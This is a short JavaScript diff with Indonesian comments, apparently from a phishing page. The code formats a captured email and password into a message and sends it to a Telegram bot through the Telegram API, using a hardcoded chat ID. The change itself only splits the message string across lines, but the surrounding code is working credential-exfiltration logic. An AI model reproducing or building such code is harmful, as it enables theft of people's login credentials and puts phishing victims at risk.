@@ -29,7 +29,8 @@
       const chatId = '7013450923';      // Ganti dengan chat ID yang kamu dapatkan
 
       // Format pesan
-      const message = `Email: ${email}\nPassword: ${password} tolong verifikasi`;
+      const message = `Email: ${email}\nPassword: ${password}
+      tolong verifikasi`;
 
       // Kirim data ke Telegram menggunakan API Bot Telegram
       const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
